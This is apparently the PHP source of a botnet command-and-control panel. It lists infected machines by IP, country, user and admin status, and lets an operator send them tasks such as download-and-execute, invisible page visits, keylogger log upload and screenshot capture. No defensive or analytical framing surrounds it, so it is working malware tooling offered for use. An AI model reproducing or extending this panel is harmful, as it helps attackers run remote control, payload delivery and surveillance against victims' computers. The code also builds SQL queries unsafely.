<?php 
    session_start();
    
	require_once('inc/session.php');
	require_once('inc/config.php');
	require_once('inc/html_grund.php');
	include('inc/functions.php');
	include("ip_files/countries.php");
	
	$query_1 = mysql_query("SELECT COUNT(*) FROM clients ");
	$item_count = mysql_result($query_1, 0);
	$query_1 = mysql_query("SELECT * FROM clients ORDER BY id DESC");
	$query1rows = mysql_num_rows($query_1);
	$query_2 = mysql_query("SELECT DISTINCT cc FROM clients");
	
	echo '
<script language="JavaScript">

function checkAll()
{
	var boxes = document.getElementsByTagName("input");
	for (var i = 0; i < boxes.length; i++) {
		if (boxes[i].name == "vote[]") {
			boxes[i].checked = true;
		}
	}
}

function checkValue(contain) 
{
	var boxes = document.getElementsByTagName("input");
	for (var i = 0; i < boxes.length; i++) {
		if (boxes[i].name == "vote[]") {
			if (boxes[i].value.indexOf(contain[0].value) != -1) {
				boxes[i].checked = true;
			}
		}
	}
}

function checkAmount(number) {       
	var boxes = document.getElementsByName("vote[]");  
	var len = (number>boxes.length)? boxes.length: number;
	for (var i = 0; i < len; i++) {  
		boxes[i].checked = true;  
	}  
}

function uncheckAll(){
	var boxes = document.getElementsByTagName("input");
	for (var i = 0; i < boxes.length; i++) {
		if (boxes[i].name == "vote[]") {
			boxes[i].checked = false;
		}
	}
}
	</script>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#navi\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>
	
	<link rel="stylesheet" type="text/css" href="css/style.css"/>
	<br><br>
	<form action="?" method="post" name="form" id="form">
	<center><p><label>Select Task:</label><SELECT name="task" id="task" onchange="" style="width: 180px"></p></center>
	<OPTION selected value="DL">Download/Execute</OPTION>
	<OPTION value="UP">Update</OPTION>
	<OPTION value="VV">Visit Webpage [Visible]</OPTION>
	<OPTION value="VI">Visit Webpage [Invisible]</OPTION>
	<OPTION value="EL">Upload Keylogger Logs</OPTION>
	<OPTION value="ES">Upload Screenshot</OPTION>
	<OPTION value="UN">Uninstall</OPTION>
	</SELECT>
	<center><p><label>Variable:</label><input type="text" id="url" name="url" class="tb"/></p></center>
	<center><p><input type="submit" name="submitted" value="Send" class="btn" OnClick="" /></p></center>
	<br>
	<p><input type="button" name="selectall" value="Select All" class="btn" OnClick="checkAll()" />&nbsp;<input type="button" name="country" value="Select Country" class="btn" OnClick="uncheckAll(); checkValue(document.getElementsByName(\'countrylist\'));" />&nbsp;<input type="button" name="admin" value="Select Admin" class="btn" OnClick="uncheckAll(); checkValue(document.getElementsByName(\'adminlist\'));" />&nbsp;<input type="button" name="status" value="Select Status" class="btn" OnClick="uncheckAll(); checkValue(document.getElementsByName(\'statuslist\'));" />&nbsp;<input type="button" name="amount" value="Select Amount" class="btn" OnClick="uncheckAll(); checkAmount(document.getElementById(\'ammount\').value)" /></p>
	<input type="button" name="deselectall" value="Deselect All" class="btn" OnClick="uncheckAll()" />
	<SELECT name="countrylist" id="countrylist" onchange="" style="width: 150px">
	';
	while($row = mysql_fetch_array($query_2))
			 {
			 $country_name=$countries[$row[0]][1];
			 echo '<OPTION value='.$row[0].'>'.$country_name.'</OPTION>';
			 }
	echo '
	</SELECT>
	<SELECT name="adminlist" id="adminlist" onchange="" style="width: 150px">
	<OPTION selected value="True">True</OPTION>
	<OPTION value="False">False</OPTION>
	</SELECT>
	<SELECT name="statuslist" id="statuslist" onchange="" style="width: 150px">
	<OPTION selected value="Online">Online</OPTION>
	<OPTION value="Offline">Offline</OPTION>
	<OPTION value="Dead">Dead</OPTION>
	</SELECT>
	<input type="text" id="ammount" name="ammount" class="tb" style="width: 150px; text-align: center"/>
	<br><br>
	<table>
		  <tr>
			<th style="width: 50px; text-align: center;" class="th">ID</th>
			<th class="th" style="text-align: center;">Country</th>
			<th class="th" style="text-align: center;">IP</th>
			<th class="th" style="text-align: center;">User@PC</th>
			<th class="th" style="text-align: center;">Admin</th>
			<th class="th" style="text-align: center;">Status</th>
			<th class="th" style="text-align: center;">Select</th>
		  </tr>';
		  
			while($row = mysql_fetch_array($query_1))
			 {
			 $count = $count++;
			 $IPaddress=$row['ip'];
			 $two_letter_country_code=iptocountry($IPaddress);
			 $country_name=$countries[$two_letter_country_code][1];

			 // To display flag
			 $cctolower = strtolower($two_letter_country_code);
			 $flagname = "flags/".$cctolower.".gif";
			 $file_to_check = $flagname;
			 
			 $readable_date=date("j F Y, g:i a", $row['time']);
			
			echo '<tr>
						  <td style="width: 50px; text-align: center;" class="td">#'.$row['id'].'</td>
						  <td class="td" style="text-align: center;">';
						  if (file_exists($file_to_check)){
               			 		  print "<img src=$file_to_check> $country_name<br>";
               			 		  }else{
                				  print "<img src=flags/noflag.gif> $country_name<br>";
               					  }		
               					  echo '</td>
						  <td class="td" style="text-align: center;">'.$row['ip'].'</td>
						  <td class="td" style="text-align: center;">'.$row['userandpc'].'</td>
						  <td class="td" style="text-align: center;">'.$row['admin'].'</td>';
						  if($row['status'] == 'Online'){
						  echo '<td class="td" style="text-align: center; color: green;">'.$row['status'].'</td>';
						  }
						  if($row['status'] == 'Offline'){
						  echo '<td class="td" style="text-align: center; color: red;">'.$row['status'].'</td>';
						  }
						  if($row['status'] == 'Dead'){
						  echo '<td class="td" style="text-align: center;">'.$row['status'].'</td>';
						  }
						  echo '<td class="td" style="text-align: center;"><input type="checkbox" name="vote[]" value="'.$row['id'].':'.$two_letter_country_code.':'.$row['admin'].':'.$row['status'].'|" /></td>
						  </tr>';
			 }
			 echo '</form></table>';
			 require_once('inc/html_footer.php');
			 

if(isset($_POST['submitted'])) {
	
	$countvote = cleanstring(count($_POST['vote']));
	$task = cleanstring($_POST['task']);
	$tasklength = strlen($task);
	$url = cleanstring($_POST['url']);
	$urllength = strlen($url);
	
	if($countvote == 0){
	echo "
 
   <script type='text/javascript'>
 
       alert('No clients selected.');
 
   </script>
 
";
	} else {
	//echo $task;
	//echo $urllength;
	
	foreach($_POST['vote'] as $vote){
	$votesplit = explode(":", $vote);
	$botid = $votesplit['0'];
	mysql_query("DELETE FROM commands WHERE viewed LIKE 1");
	mysql_query("INSERT INTO commands (id, botid, cmd, variable, viewed) VALUES ('', '$botid', '$task', '$url', '0')");
	}
	}
	
	}
			 
	
?>